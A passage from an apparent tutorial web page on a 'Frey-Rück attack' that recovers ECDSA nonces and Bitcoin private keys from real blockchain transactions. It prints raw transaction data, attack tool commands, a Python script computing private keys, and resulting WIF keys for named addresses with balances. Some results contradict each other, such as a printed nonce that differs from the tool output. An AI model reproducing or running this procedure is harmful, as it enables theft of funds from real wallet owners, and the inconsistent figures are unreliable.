K = 0xfe150813ba57b990dc7bfacbd3f6c8f6c78a3758789628bdb53808a7fb0d8154
R = 0xcda94253bf560fbb22c5dfd6b6d8d2f58d6401bfdca0a7e1dde84e3b2186b0e8
S = 0xab8ea68d18501eee92408390e9fffd5f5a5b029821f09f4a2914b84ad8428975
Z = 0x9d568564500c4b9911ccd4dbb3865e0c9129f2697e9a710f575c63f5f22753b1


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-64.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1017"></figure>



<p><code>PrivKey = 4f539d49b23b87697b74e2f508d4260936e5f47856dae5090d4f5bde1b863a82</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5
WIF:  KysupQsbEPB7cEcUwpTpxdCAMTVLa9RjVtSzFZbrRV5pcNe2fk4Q
HEX:  4f539d49b23b87697b74e2f508d4260936e5f47856dae5090d4f5bde1b863a82</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/a2.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-824"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5">https://www.blockchain.com/btc/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><a href="https://www.blockchain.com/btc/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5" target="_blank" rel="noreferrer noopener"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-18-1024x449.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-802"></a><figcaption><strong><code>www.blockchain.com/btc/address/1HYDQRwXbvVYpmDn6kGJ6kjyewvtyz1CL5</code></strong></figcaption></figure>



<p><code>BALANCE: $ 677.14</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><code>№3</code></strong></p>



<p>With detailed cryptanalysis, we also found a critical vulnerability in Bitcoin Address:</p>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener">16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</a></strong></p><p><a href="https://btc.exan.tech/tx/c393f6b4651ac109cf90476bab878df624a1867c616a8cd69d0710e7676cd6d4" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/c393f6b4651ac109cf90476bab878df624a1867c616a8cd69d0710e7676cd6d4</a></p><p><a href="https://btc.exan.tech/tx/989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6</a></p></blockquote>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-5.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-661"></figure>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-6.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-663"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener">16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</a></strong></p><p><a href="https://btc.exan.tech/tx/c393f6b4651ac109cf90476bab878df624a1867c616a8cd69d0710e7676cd6d4" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/c393f6b4651ac109cf90476bab878df624a1867c616a8cd69d0710e7676cd6d4</a></p></blockquote>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-20-1024x93.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-858"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001994710097c3901265cc9a6d9efb9d1d3135ef86b627e345e10590455d8c532b9150000006b483045022062786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143022100b0f6a7a99e2fa826507b7645f1c0d67213db699b2c2bb3df438b820e4c53a75a01210205ea35089d57f0282fab836217e5a702d8fa528cef078d60f523fec2ca9c2f50ffffffff010000000000000000046a02445300000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001994710097c3901265cc9a6d9efb9d1d3135ef86b627e345e10590455d8c532b9150000006b483045022062786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143022100b0f6a7a99e2fa826507b7645f1c0d67213db699b2c2bb3df438b820e4c53a75a01210205ea35089d57f0282fab836217e5a702d8fa528cef078d60f523fec2ca9c2f50ffffffff010000000000000000046a02445300000000
</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-65-1024x256.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1020"></figure>



<pre class="wp-block-code"><code>R = 0x62786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143
S = 0xb0f6a7a99e2fa826507b7645f1c0d67213db699b2c2bb3df438b820e4c53a75a
Z = 0xd423dca052d4c5b84cf9b847a0fb9ad192cb131da70e6b3770e6444e4b8e06d0</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001994710097c3901265cc9a6d9efb9d1d3135ef86b627e345e10590455d8c532b9150000006b483045022062786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143022100b0f6a7a99e2fa826507b7645f1c0d67213db699b2c2bb3df438b820e4c53a75a01210205ea35089d57f0282fab836217e5a702d8fa528cef078d60f523fec2ca9c2f50ffffffff010000000000000000046a02445300000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool frey_ruck_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-66-1024x306.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1022"></figure>



<p>We launched this attack from&nbsp;<code>-tool frey_ruck_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-67-1024x462.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1024"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xf228f3857bd39809d8de6ba8eeb4f21d2d7acc6156a972cd9a2baaa9f8f6a7ce

RawTX = 0100000001994710097c3901265cc9a6d9efb9d1d3135ef86b627e345e10590455d8c532b9150000006b483045022062786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143022100b0f6a7a99e2fa826507b7645f1c0d67213db699b2c2bb3df438b820e4c53a75a01210205ea35089d57f0282fab836217e5a702d8fa528cef078d60f523fec2ca9c2f50ffffffff010000000000000000046a02445300000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xf228f3857bd39809d8de6ba8eeb4f21d2d7acc6156a972cd9a2baaa9f8f6a7ce</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xf228f3857bd39809d8de6ba8eeb4f21d2d7acc6156a972cd9a2baaa9f8f6a7ce</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-68-1024x93.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1027"></figure>



<p><code>(0x62786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143 , 0xe9c10b0f39c777469072719ca1981197061d58b4cbf354d60a0ebb63d5bf6125)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x62786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143
S = 0xb0f6a7a99e2fa826507b7645f1c0d67213db699b2c2bb3df438b820e4c53a75a
Z = 0xd423dca052d4c5b84cf9b847a0fb9ad192cb131da70e6b3770e6444e4b8e06d0</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x62786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143
point2gen  =   (0x62786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143 , 0xe9c10b0f39c777469072719ca1981197061d58b4cbf354d60a0ebb63d5bf6125)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xf228f3857bd39809d8de6ba8eeb4f21d2d7acc6156a972cd9a2baaa9f8f6a7ce</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xf228f3857bd39809d8de6ba8eeb4f21d2d7acc6156a972cd9a2baaa9f8f6a7ce
R = 0x62786f4af117771202ba326b468b074cf34946bc3a6605bf1cb4ebd832438143
S = 0xb0f6a7a99e2fa826507b7645f1c0d67213db699b2c2bb3df438b820e4c53a75a
Z = 0xd423dca052d4c5b84cf9b847a0fb9ad192cb131da70e6b3770e6444e4b8e06d0


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-69.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1028"></figure>



<p><code>PrivKey = 4dc65ac1c7863c8a7a868f369b7a37ec1918d429fff3afbc97fcdf4b454fbfe1</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2
WIF:  KyptrwaRhaF7VCwnWo2FDMoRCj9KGvoESDGmxtRk7b65csxaU2aM
HEX:  4dc65ac1c7863c8a7a868f369b7a37ec1918d429fff3afbc97fcdf4b454fbfe1</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/a3.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-864"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2">https://www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><a href="https://www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-21-1024x459.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-867"></a><figcaption><strong><a href="https://www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener">www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</a></strong></figcaption></figure>



<p><code>BALANCE: $ 711.91</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p></blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<strong><a href="https://btc.exan.tech/tx/989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6" target="_blank" rel="noreferrer noopener">989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6</a></strong>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc.exan.tech/tx/989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6" target="_blank" rel="noreferrer noopener"></a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener">16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</a></strong></p><p><a href="https://btc.exan.tech/tx/989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/989ba4524367fbaf75e974a5ff2420d48ba32ebedb1416a0a36c3e575be350d6</a></p></blockquote>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-19-1024x95.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-851"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001a48220a0fcc53f187abaaed77e1fb6e3fe870f2f77ecc26baf6ae2bb1cbbb3b2070000006b483045022015662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238022100c3f838aca7d8a74904f341dd2394616e72f470cfd371fb52d30da146606c2c3001210205ea35089d57f0282fab836217e5a702d8fa528cef078d60f523fec2ca9c2f50ffffffff010000000000000000046a02445300000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001a48220a0fcc53f187abaaed77e1fb6e3fe870f2f77ecc26baf6ae2bb1cbbb3b2070000006b483045022015662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238022100c3f838aca7d8a74904f341dd2394616e72f470cfd371fb52d30da146606c2c3001210205ea35089d57f0282fab836217e5a702d8fa528cef078d60f523fec2ca9c2f50ffffffff010000000000000000046a02445300000000
</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-70-1024x268.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1030"></figure>



<pre class="wp-block-code"><code>R = 0x15662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238
S = 0xc3f838aca7d8a74904f341dd2394616e72f470cfd371fb52d30da146606c2c30
Z = 0x560177d0444e4271e144501d614bc8f564f320196b2c7c47922e7f8e6664d0bc</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>0100000001a48220a0fcc53f187abaaed77e1fb6e3fe870f2f77ecc26baf6ae2bb1cbbb3b2070000006b483045022015662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238022100c3f838aca7d8a74904f341dd2394616e72f470cfd371fb52d30da146606c2c3001210205ea35089d57f0282fab836217e5a702d8fa528cef078d60f523fec2ca9c2f50ffffffff010000000000000000046a02445300000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool frey_ruck_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-71-1024x312.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1033"></figure>



<p>We launched this attack from&nbsp;<code>-tool frey_ruck_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-72-1024x454.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1035"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x58d6e63d9240827078edf802e475bb04cd889e7308e409623b1dc92e61e4fd55

RawTX = 0100000001a48220a0fcc53f187abaaed77e1fb6e3fe870f2f77ecc26baf6ae2bb1cbbb3b2070000006b483045022015662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238022100c3f838aca7d8a74904f341dd2394616e72f470cfd371fb52d30da146606c2c3001210205ea35089d57f0282fab836217e5a702d8fa528cef078d60f523fec2ca9c2f50ffffffff010000000000000000046a02445300000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE)</code></p>



<p><code>K = 0xf228f3857bd39809d8de6ba8eeb4f21d2d7acc6156a972cd9a2baaa9f8f6a7ce</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>secret key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x58d6e63d9240827078edf802e475bb04cd889e7308e409623b1dc92e61e4fd55</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-73-1024x94.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1039"></figure>



<p><code>(0x15662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238 , 0xfc2f3b91b19091745fb29d48725f1060ce4924624b01ff57f14b683430822c8a)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0x15662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238
S = 0xc3f838aca7d8a74904f341dd2394616e72f470cfd371fb52d30da146606c2c30
Z = 0x560177d0444e4271e144501d614bc8f564f320196b2c7c47922e7f8e6664d0bc</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0x15662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238
point2gen  =   (0x15662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238 , 0xfc2f3b91b19091745fb29d48725f1060ce4924624b01ff57f14b683430822c8a)</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x58d6e63d9240827078edf802e475bb04cd889e7308e409623b1dc92e61e4fd55</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x58d6e63d9240827078edf802e475bb04cd889e7308e409623b1dc92e61e4fd55
R = 0x15662ae61310e08fc132428277ae851378adc0b82ee3246d860a0a1d35755238
S = 0xc3f838aca7d8a74904f341dd2394616e72f470cfd371fb52d30da146606c2c30
Z = 0x560177d0444e4271e144501d614bc8f564f320196b2c7c47922e7f8e6664d0bc


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-74.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-1043"></figure>



<p><code>PrivKey = 4dc65ac1c7863c8a7a868f369b7a37ec1918d429fff3afbc97fcdf4b454fbfe1</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2
WIF:  KyptrwaRhaF7VCwnWo2FDMoRCj9KGvoESDGmxtRk7b65csxaU2aM
HEX:  4dc65ac1c7863c8a7a868f369b7a37ec1918d429fff3afbc97fcdf4b454fbfe1</code></pre>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/a3.png" alt="DDD" class="wp-image-864"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2">https://www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><a href="https://www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-21-1024x459.png" alt="DDD" class="wp-image-867"></a><figcaption><strong><a href="https://www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2" target="_blank" rel="noreferrer noopener">www.blockchain.com/btc/address/16CuW7dQfZ2TwT9ZAQrUFm5DP7P11w5Fp2</a></strong></figcaption></figure>



<p><code>BALANCE: $ 711.91</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><code>№4</code></strong></p>



<p>With detailed cryptanalysis, we also found a critical vulnerability in Bitcoin Address:</p>



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q" target="_blank" rel="noreferrer noopener">12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q</a></strong></p><p><a href="https://btc.exan.tech/tx/ac6259da5eb98bf11b5cda804175ac666ebd1b7118da51d206936b43cb368542" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/ac6259da5eb98bf11b5cda804175ac666ebd1b7118da51d206936b43cb368542</a></p><p><a href="https://btc.exan.tech/tx/4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/4ff10d8a7246f0c46acb9fefa6ea23497f6b7825307414ca3fc80bcbae9194af</a></p></blockquote>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-7.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-667"></figure>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-8.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-668"></figure>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote"><p><strong><a href="https://btc.exan.tech/address/12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q" target="_blank" rel="noreferrer noopener">12Pm2muhQKuVtAHwJzdaiSLRa9QxgLpx5Q</a></strong></p><p><a href="https://btc.exan.tech/tx/ac6259da5eb98bf11b5cda804175ac666ebd1b7118da51d206936b43cb368542" target="_blank" rel="noreferrer noopener">https://btc.exan.tech/tx/ac6259da5eb98bf11b5cda804175ac666ebd1b7118da51d206936b43cb368542</a></p></blockquote>



<figure class="wp-block-image"><img src="./Implement Frey-Rück Attack to get the secret key_K_NONCE_files/image-22-1024x95.png" alt="Implement Frey-Rück Attack to get the secret key &quot;K&quot; (NONCE)" class="wp-image-883"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001d5ecb7299d4005bc1c9bb2325de6428a882a6df8fefd74e740139a6b53bdb40e060000006b4830450221009cff5d8357756520391438c44415c706036e9e16d440cb8892e4b91423f0f67502204e8eaec16ebb4816d53cd08f882221c37db6aed27b5c77a0cb12455af91200ac012103c1915f97b2480c478e6b1111ae03c29f55013351a126b7f0cfbab4a34f3c712bffffffff010000000000000000046a02445300000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



